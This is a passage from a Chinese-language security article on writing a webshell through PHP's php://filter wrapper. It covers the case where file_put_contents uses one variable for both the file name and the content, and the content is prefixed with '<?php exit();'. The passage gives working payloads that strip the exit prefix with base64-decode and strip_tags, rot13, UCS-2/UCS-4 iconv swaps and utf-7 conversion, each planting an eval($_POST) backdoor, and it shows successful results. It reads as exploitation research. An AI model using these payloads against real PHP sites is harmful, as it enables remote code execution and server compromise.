针对相同变量的文件`exit`写入shell的绕过手法，除了上面这些方法绕过以外，关于php://filter其他的奇思妙想，感兴趣的还可以在进行探索发现。

### <a class="reference-link" name="Bypass-%E7%9B%B8%E5%90%8C%E5%8F%98%E9%87%8F"></a>Bypass-相同变量

这种情况主要是针对写入shell的文件名和内容的变量一样的时候进行探索绕过，这个时候文件名和内容就是同一个变量，而不像第一种方式那样可以比较容易的绕过，这种方式需要考虑文件名变量内容和文件内容数据的兼容性。

关于这种情景下的利用分析主要参考最近安全圈的一些研究：
- 4月份，安恒发布的一篇渗透测试文章[一次“SSRF—&gt;RCE”的艰难利用](https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA)里面提到了使用`convert.iconv.UCS-xxx.UCS-xxx`转换器进行绕过【重点是字符串的单元组反转-&gt;导致本身正常的代码因编码转换而失效】。
- 4月份，P牛知识星球他所提到的一种手法使用`string.trip_tags|convert.base64-decode`进行绕过【重点是构造头部标签的闭合-&gt;恶意代码的编码-&gt;标签的剔除-&gt;恶意代码的解码】。
- 3月份，先知的一篇文章[Thinkphp5.0反序列化链在Windows下写文件的方法](https://xz.aliyun.com/t/7457)中提的使用`convert.iconv.utf-8.utf-7|convert.base64-decode`进行绕过【重点是编码之间的转换（编码特殊字符）-&gt;base64正常解码】。
- 3月份，先知的一篇文章[关于 ThinkPHP5.0 反序列化链的扩展](https://xz.aliyun.com/t/7310)中使用`string.trip_tags|convert.base64`进行绕过`&lt;?php exit(); ?&gt;`【重点是构造标签的闭合（闭合特殊字符）-&gt;恶意代码的编码-&gt;标签的剔除-&gt;恶意代码的解码】。
- 4月份，cyc1e师傅blog的一篇文章[关于file_put_contents的一些小测试](https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/)里面也有很多技巧【重点里面写入正常文件名技巧这个思路很好：过滤器里面写入payload、`../`跨目录写入文件。其它也就是一些过滤器的组合使用进行绕过，思路和上面已有的文章一样】
具体分析介绍如下：

<a class="reference-link" name="%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"></a>**测试代码**

```
&lt;?php
$a = $_GET[a];
file_put_contents($a,'&lt;?php exit();'.$a)
?&gt;
```

这段代码在ThinkPHP5.0.X反序列化中出现过，利用其组合才能够得到RCE。有关ThinkPHP5.0.x的反序列化这里就不说了，主要是探索如何利用php://filter绕过该限制写入shell后门得到RCE的过程。

<a class="reference-link" name="%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"></a>**代码分析**

分析代码可以看到，这种情况下写入的文件，其文件名和文件部分内容一致，这就导致利用的难度大大增加了，不过最终目的还是相同的：都是为了去除文件头部内容`exit`这个关键代码写入shell后门。

<a class="reference-link" name="convert.base64"></a>**convert.base64**

在上面不同变量利用base64构造payload的基础上，可以针对相同变量再次构造相应payload，在文件名中包含，满足正常解码就可以。
- 构造payload
```
a=php://filter/write=convert.base64-decode/resource=PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+.php

//注意payload中的字符'+'在浏览器中需要转换为%2B
```

正常情况下都会想到使用上述payload进行利用，但是这样构造发现是不可以的，因为构造的payload里面包含`'='`符号，熟悉base64编码的应该知道`'='`号在base64编码中起填充作用，也就意味着后面的结束，正是因为这样，当base64解码的时候如果字符`'='`后面包含有其他字符则会报错。具体见上文提到的先知的两篇文章里面都有提到使用base64编码所遇到的问题，里面也有提到即使关键字`read、write`可以去除，但是`resource`关键字不能少，也就导致不能直接使用这种方式去绕过。

下面可以进行测试验证有关字符`'='`在base64解码中的问题

```
&gt;&gt;&gt; base64.b64decode("PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+")
&gt;&gt;&gt; base64.b64decode("PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+=")
&gt;&gt;&gt; base64.b64decode("PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+=q")
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e38bbeece5f3b4fe.png)

从测试的结果来看base64解码的时候字符`'='`后面确实不能包含有其他字符，通过参考上述先知的两篇文章以及p牛的方法就可以绕过base64编码由于等号字符造成的问题，有关分析见下面相关过滤器部分。

<a class="reference-link" name="string.strip_tags"></a>**string.strip_tags**

这里关于`string.strip_tags`分两种环境去测试分析：这里限制条件同样在相同变量下

```
# 第一种
&lt;?php exit;

# 第二种
&lt;?php exit; ?&gt;
```

<a class="reference-link" name="%E7%AC%AC%E4%B8%80%E7%A7%8D"></a>**第一种**

由于上面`Bypass-不同变量`这种情况下的限制代码直接就是`&lt;?php exit; ?&gt;`可以直接利用`strip_tags`去掉，但是现在这种情况下的限制代码和上面的有点不一样了，少了一段字符`?&gt;`，其限制代码为`&lt;?php exit;`，不过构造的目的是相同的最终还是要把`exit;`给去除掉。

分析两者限制代码的不同，那么我们可以直接再给它加一个`?&gt;`字符串进行闭合就可以利用了
- 构造payload
```
a=php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+.php
```
- 代码合并
```
&lt;?php  exit();php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+.php
```

分析合并后的代码文件内容，发现成功的构造php标签`&lt;?php xxxx ?&gt;`，同时也可以发现代码中的字符等号’=’也包含在php标签里面，那么在经过strip_tags处理的时候都会去除掉，之后就不会影响base64的正常解码了。
- 载荷效果
[![](https://p3.ssl.qhimg.com/t0190721894882837df.png)](https://p3.ssl.qhimg.com/t0190721894882837df.png)

可以看到payload请求成功，在服务器上生成了相应的文件，同时也正常的写入了webshell

虽然这样利用成功了，但是会发现这样的文件访问会有问题的，采用`[@Cyc1e](https://github.com/Cyc1e)`师傅里面介绍的方法，利用`../`重命名即可解决。【关于这种方法`../`其实先知的两篇文章ThinkPHP5.0反序列化利用链里面的payload就存在`../`，还是太菜了当时只分析了使用什么过滤器可以进行绕过 emmmm……】
- 利用技巧
```
a=php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+/../Qftm.php
```

把`?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+`作为目录名（不管存不存在），再用`../`回退一下，这样创建出来的文件名为Qftm.php，这样创建出来的文件名就正常了。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01f89e77b76b5d1e22.png)

有一个缺点就是这种利用手法在windows下利用不成功，因为文件名里面的`? &gt;`等这些是特殊字符会导致文件的创建失败，关于这个问题上面先知的第一篇文章中也有提到这个问题，以及对于这种问题的解决方法：使用`convert.iconv.utf-8.utf-7|convert.base64-decode`进行绕过；同时也可以借鉴`[@Cyc1e](https://github.com/Cyc1e)`师傅文章里面介绍的方法，利用非php://filter过滤器写入payload进行绕过，生成正常文件名；利用这两种方法既可以在Linux下写入文件也可以在Windows下写入文件，具体见下面相关过滤器利用。

<a class="reference-link" name="%E7%AC%AC%E4%BA%8C%E7%A7%8D"></a>**第二种**

```
&lt;?php
$a = $_GET[a];
file_put_contents($a,'&lt;?php exit; ?&gt;'.$a)
?&gt;
```

对于这种情况主要是限制代码本身是闭合的同时有关变量相同，对于这种问题可以借鉴上面先知的第二篇文章有关解决方法，使用`string.trip_tags|convert.base64`过滤进行绕过。
- 构造payload
```
php://filter/%3C|string.strip_tags|convert.base64-decode/resource=%3EPD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8%2B/../Qftm.php
```

关于过滤器里面写入`&lt;|`这个过滤器，虽然php://filter里面没有但是不会爆出致命错误具有一定的兼容性。由于base64解码受字符`'='`的限制，那么则可以将其闭合在标签里面进行剔除，然后再进行base64解码。
- 利用
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0186ec4a78f3329994.jpg)

这种方法同样无法在Windows下写入文件只限于Linux下（特殊字符的存在导致）。

<a class="reference-link" name="string.rot13"></a>**string.rot13**

这种方法在`Bypass-不同变量`中的短标签过滤器可以直接拿到使用进行绕过，间接性构造相应的payload，这里的限制不需要闭合`exit;`也可以利用。
- 构造payload
```
a=php://filter/write=string.rot13/resource=&lt;?cuc @riny($_CBFG[Dsgz])?&gt;/../Qftm.php
a=php://filter/write=string.rot13/resource=?&gt;&lt;?cuc @riny($_CBFG[Dsgz])?&gt;/../Qftm.php
```
- 载荷效果
[![](https://p4.ssl.qhimg.com/t01a72498187f04e075.png)](https://p4.ssl.qhimg.com/t01a72498187f04e075.png)

可以看到payload利用成功，生成目标恶意代码文件，同时恶意代码文件访问执行成功

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c62dea0fb3a9b53d.png)

针对`string.rot13`这种Bypass手段，还有另一种方法可以生成正常文件，也就是上面提到的，利用非php://filter过滤器写入payload进行绕过，生成正常文件名，虽然该过滤器不存在但是php://filter处理的时候只会显示警告信息不影响后续代码流程的执行（关于这个方法原理也就类似上面`string.strip_stags`的第二种情况通过将`&lt;`不存在的过滤器写入过滤器中闭合后续标签剔除特殊字符）。
- 构造payload
```
a=php://filter/write=string.rot13|&lt;?cuc @riny($_CBFG[Dsgz])?&gt;/resource=Qftm.php
```

这种构造可以使得恶意代码不会存在文件名中，避免了一下文件名因包含特殊字符而出错，当然这种构造在windows下一样可以正常利用。
- 载荷效果
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01839b0d337502e320.png)

<a class="reference-link" name="convert.iconv.*"></a>**convert.iconv.***

关于`convert.iconv.*`的详细介绍可以看上面对php://filter的介绍。

对于iconv字符编码转换进行绕过的手法，其实类似于上面所述的base64编码手段，都是先对原有字符串进行某种编码然后再解码，这个过程导致最初的限制`exit;`去除，而我们的恶意代码正常解码存储。

<a class="reference-link" name="UCS-2"></a>**UCS-2**

UCS-2编码转换

```
php &gt; echo iconv("UCS-2LE","UCS-2BE",'&lt;?php @eval($_POST[Qftm]);?&gt;');

?&lt;hp pe@av(l_$OPTSQ[tf]m;)&gt;?

&gt;&gt;&gt; len("&lt;?php @eval($_POST[Qftm]);?&gt;")
28 -&gt; 2*14
&gt;&gt;&gt;
```

通过UCS-2方式，对目标字符串进行2位一反转（这里的2LE和2BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-2中2的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了
- 构造payload
```
a=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSQ[tf]m;)&gt;?/resource=Qftm.php

合并的payload：
&lt;?php exit();php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSQ[tf]m;)&gt;?/resource=Qftm.php

核心部分：
&lt;?php exit();php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSQ[tf]m;)&gt;?

&gt;&gt;&gt; len("&lt;?php exit();php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSQ[tf]m;)&gt;?")
84 -&gt; 2*42
&gt;&gt;&gt;

```
- 载荷效果
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t010c2bfa2130833058.png)

从请求和服务器查看结果可以看到构造的payload执行传入恶意代码后门webshell成功。

<a class="reference-link" name="UCS-4"></a>**UCS-4**

UCS-4编码转换

```
php &gt; echo iconv("UCS-4LE","UCS-4BE",'&lt;?php @eval($_POST[Qftm]);?&gt;');

hp?&lt;e@ p(lavOP_$Q[TS]mtf&gt;?;)

&gt;&gt;&gt; len("&lt;?php @eval($_POST[Qftm]);?&gt;")
28 -&gt; 4*7
&gt;&gt;&gt;
```

通过UCS-4方式，对目标字符串进行4位一反转（这里的4LE和4BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-4中4的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了
- 构造payload
```
a=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$Q[TS]mtf&gt;?;)/resource=Qftm.php

合并的payload：
&lt;?php exit();php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$Q[TS]mtf&gt;?;)/resource=Qftm.php

核心部分：
&lt;?php exit();php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$Q[TS]mtf&gt;?;)

&gt;&gt;&gt; len("&lt;?php exit();php://filter/convert.iconv.UCS-4LE.UCS-4BE|")
56 -&gt; 4*14
&gt;&gt;&gt;

```
- 载荷效果
[![](https://p0.ssl.qhimg.com/t0113dbaa8540d5c6e6.png)](https://p0.ssl.qhimg.com/t0113dbaa8540d5c6e6.png)

从请求和服务器查看结果可以看到构造的payload执行传入恶意代码后门webshell成功。

<a class="reference-link" name="utf8-utf7"></a>**utf8-utf7**
- 测试代码
```
&lt;?php

$a='php://filter/convert.iconv.utf-8.utf-7/resource=Qftm.txt';
file_put_contents($a,'=');

/**
Qftm.txt 写入的内容为: +AD0-
**/

```

从结果可以看到，convert.iconv 这个过滤器把 `=` 转化成了 `+AD0-`，要知道 `+AD0-` 是可以被 `convert.base64-decode`过滤器解码的。
- 构造payload
```
a=php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=Qftm.php
//这里需要注意的是要符合base64解码按照4字节进行的

utf-8 -&gt; utf-7
+ADw?php exit()+ADs-php://filter/write+AD0-PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+-+AHw-convert.iconv.utf-8.utf-7/resource+AD0-Qftm.php

base64解码特点剔除不符合字符（只要恶意代码前面部分正常就可以，长度为4的倍数）
+ADwphpexit+ADsphp//filter/write+AD0

&gt;&gt;&gt; len("+ADwphpexit+ADsphp//filter/write+AD0")
36 -&gt; 4*9
&gt;&gt;&gt;

正常base64解码部分
+ADwphpexit+ADsphp//filter/write+AD0PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+
```
- 载荷效果
[![](https://p3.ssl.qhimg.com/t014d4a9f16f757791f.png)](https://p3.ssl.qhimg.com/t014d4a9f16f757791f.png)

可以看到这种转换过滤器编码转换效果是可以的，成功绕过了base64与`exit;`的限制。



## 总结

通过参考许多公开的部分技术文章进行探索、实践与总结，可以看到，其中提到了关于php://filter常用的过滤器利用与多种过滤器组合利用的手法及其非过滤器兼容性技巧来进行漏洞挖掘或者Bypass，可能关于php://filter还有其他很多的过滤器可以利用绕过，不过思路和各个文章中提到的都是一样的，都是通过某个过滤器或多个过滤器特定功能利用来绕过相应限制达到一定的目的。



## References
- [谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
- [一次“SSRF—&gt;RCE”的艰难利用](https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA)
- [Thinkphp5.0反序列化链在Windows下写文件的方法](https://xz.aliyun.com/t/7457)
- [关于 ThinkPHP5.0 反序列化链的扩展](https://xz.aliyun.com/t/7310)
<li>
[关于file_put_contents的一些小测试](//cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/))</li>
- [可用过滤器列表](https://www.php.net/manual/zh/filters.php)